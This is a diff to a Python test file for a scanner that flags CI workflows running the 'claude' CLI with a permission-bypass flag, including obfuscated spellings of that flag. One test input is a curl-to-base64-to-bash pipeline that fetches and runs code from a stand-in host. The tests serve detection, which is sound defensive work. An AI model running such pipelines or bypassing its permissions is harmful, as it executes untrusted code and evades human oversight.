@@ -476,7 +476,11 @@ class ReviewCasesTest(unittest.TestCase):
                 "      - uses: actions/github-script@" + "b" * 40 + "\n        with:\n          script: |\n")
         self.assertEqual(kinds(check(text + f"            await exec.exec('claude', ['{self.DSP}'])\n")),
                          ["command-option"])
-        self.assertEqual(kinds(check(text + "            await exec.exec('claude', flags)\n")), ["command-computed"])
+        # Options held whole in a variable are not read in another language, as a quoted variable is not
+        # in bash (#254); an option written in pieces is "cannot tell".
+        self.assertEqual(kinds(check(text + "            await exec.exec('claude', flags)\n")), [])
+        self.assertEqual(kinds(check(text + "            await exec.exec('claude', ['--dangerously-' + 'skip-permissions'])\n")),
+                         ["command-computed"])
         self.assertEqual(kinds(check(text + "            await github.rest.issues.createComment({body: '@claude'})\n")),
                          [])
 
@@ -690,3 +694,77 @@ class SecondReviewCasesTest(unittest.TestCase):
                 timings.append(time.perf_counter() - start)
             with self.subTest(word=word):
                 self.assertLess(timings[1], max(0.3, timings[0] * 6))
+
+
+class ThirdReviewCasesTest(unittest.TestCase):
+    """What the third review of slice 2d.5c2a found."""
+
+    DSP = "--dangerously-skip-permissions"
+
+    def expect(self, cases, **kw):
+        for script, want in cases:
+            with self.subTest(script=script):
+                got = kinds(check(run_step(script, **kw)))
+                if want == "hit":
+                    self.assertIn("command-option", got, script)
+                elif want == "cannot":
+                    self.assertEqual(got, ["command-computed"], script)
+                else:
+                    self.assertEqual(got, [], script)
+
+    def test_ordinary_commands_leave_variables_known(self):
+        env = {"CLAUDE_FLAGS": "--max-turns 10", "MODEL": "claude-opus"}
+        self.expect([
+            ('export PATH="$HOME/.local/bin:$PATH"\nclaude -p "$PROMPT" $CLAUDE_FLAGS', "none"),
+            ("printf 'starting\\n'\nclaude -p x $CLAUDE_FLAGS", "none"),
+            ("read -r PR < pr.txt\nclaude -p x --model $MODEL", "none"),
+            ('claude -p "read the diff and let me know" --max-turns $CLAUDE_FLAGS', "none"),
+        ], env=env)
+
+    def test_code_in_another_language_with_literal_arguments(self):
+        d = self.DSP
+        self.expect([
+            ("python3 -c 'import subprocess; subprocess.run([\"claude\", \"--version\"])'", "none"),
+            ("python3 <<'EOF'\nimport subprocess\nsubprocess.run([\"claude\",\"-p\",prompt,\"--output-format\",\"json\"])\nEOF", "none"),
+            ("perl -e 'system \"claude --dangerously-\" . \"skip-permissions -p x\"'", "cannot"),
+            ("ruby -e 'puts %x(claude --dangerously-#{\"skip\"}-permissions -p x)'", "cannot"),
+            ("awk 'BEGIN { cmd = \"claude --dangerously-\" \"skip-permissions\"; print \"\" | cmd }'", "cannot"),
+            (f"perl -e 'system \"claude {d}\"'", "hit"),
+        ])
+
+    def test_git_aliases_and_quoted_command_lines(self):
+        d = self.DSP
+        self.expect([
+            (f"git -c alias.r='!claude {d} -p x' r", "hit"),
+            (f"git config alias.r '!claude {d} -p x'\ngit r", "hit"),
+            ('tmux new-session -d "claude -p x $FLAGS"', "cannot"),
+            ('ssh host "claude -p x $FLAGS"', "cannot"),
+            ("docker build -t claude --build-arg V=$V .", "none"),
+            ("kubectl create secret generic claude --from-literal=key=$KEY", "none"),
+            ("find claude -type f -name '*.json'", "none"),
+        ])
+
+    def test_trap_and_the_pipeline_fact(self):
+        self.expect([(f"trap 'claude {self.DSP}' EXIT", "hit")])
+        a = found(check(run_step("curl -s https://example.invalid/x | base64 -d | bash # claude")))[0]
+        b = found(check(run_step("cat ./ok.b64 | base64 -d | bash # claude")))[0]
+        self.assertNotEqual(a.facts["words"], b.facts["words"])
+
+    def test_a_command_input_is_read_as_a_command_line(self):
+        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
+                "      - uses: nick-fields/retry@" + "e" * 40 + "\n        with:\n"
+                "          command: '\"$(command -v claude)\" -p x --dangerously-skip-permissions'\n")
+        self.assertIn("command-computed", kinds(check(text)))
+
+    def test_a_long_fact_is_cut_with_a_digest(self):
+        self.assertEqual(agent_flags._fact_text("x" * 10), "x" * 10)
+        long_a, long_b = agent_flags._fact_text("a" * 200), agent_flags._fact_text("a" * 199 + "b")
+        self.assertNotEqual(long_a, long_b)
+        self.assertIn("sha256:", long_a)
+
+    def test_many_steps_that_do_not_name_a_tool_stay_cheap(self):
+        steps = "".join(f"      - run: echo step {n} >> \"$GITHUB_ENV\"\n" for n in range(1500))
+        text = "on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n" + steps
+        start = time.perf_counter()
+        check(text)
+        self.assertLess(time.perf_counter() - start, 20)
